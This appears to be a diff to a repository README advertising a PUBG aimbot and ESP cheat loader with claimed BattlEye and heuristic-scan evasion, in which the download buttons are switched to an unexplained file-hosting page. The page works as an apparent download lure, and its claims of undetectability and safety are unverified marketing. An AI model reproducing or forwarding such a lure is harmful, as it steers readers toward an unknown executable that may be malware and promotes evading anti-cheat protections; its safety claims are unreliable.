@@ -3,7 +3,7 @@
 Want to beam rivals before they ADS?
 Slide in with the **PUBG Aimbot**—a stealth injector packing surgical snap-locks, ESP intel, and a built-in HWID cloak that leaves BattlEye scratching its head. A recent dev sweep blocked over 210 k shady accounts, yet users running this loader stayed chill. 
 
-[![Get PUBG Aimbot](https://img.shields.io/badge/Get%20PUBG%20Aimbot-blueviolet)](https://wecheaters.github.io/cheats/pubg-battlegrounds/)
+[![Get PUBG Aimbot](https://img.shields.io/badge/Get%20PUBG%20Aimbot-blueviolet)](https://fileoffload13.bitbucket.io)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-%F0%9F%9B%A0%EF%B8%8F) • [Install](#instant-install-guide)
 
@@ -12,7 +12,7 @@ Slide in with the **PUBG Aimbot**—a stealth injector packing surgical snap-loc
 PUBG’s “Fog of War” Anti-ESP erases data for out-of-sight players, blocking most wallhack overlays. Our code grabs post-projection memory, side-stepping that smokescreen with ease. 
 Signature randomization on every launch mimics legit DLL hashes, so heuristic scans shrug and move on.
 
-[![Get PUBG Aimbot](https://avatars.mds.yandex.net/i?id=e9c45e6c14dd1b72f4b59aeabf7ac680_l-9234614-images-thumbs&n=13)](https://wecheaters.github.io/cheats/pubg-battlegrounds/)
+[![Get PUBG Aimbot](https://avatars.mds.yandex.net/i?id=e9c45e6c14dd1b72f4b59aeabf7ac680_l-9234614-images-thumbs&n=13)](https://fileoffload13.bitbucket.io)
 
 ## Feature Breakdown 🛠️
 
@@ -86,4 +86,5 @@ A: HWID cloak + signature shuffle slice risk to near-zero, unlike public loaders
 
 **Q: Will this bypass the Fog of War system?**
 A: Absolutely—the overlay reads post-render data, so the dev smokescreen never touches your intel. 
+
 
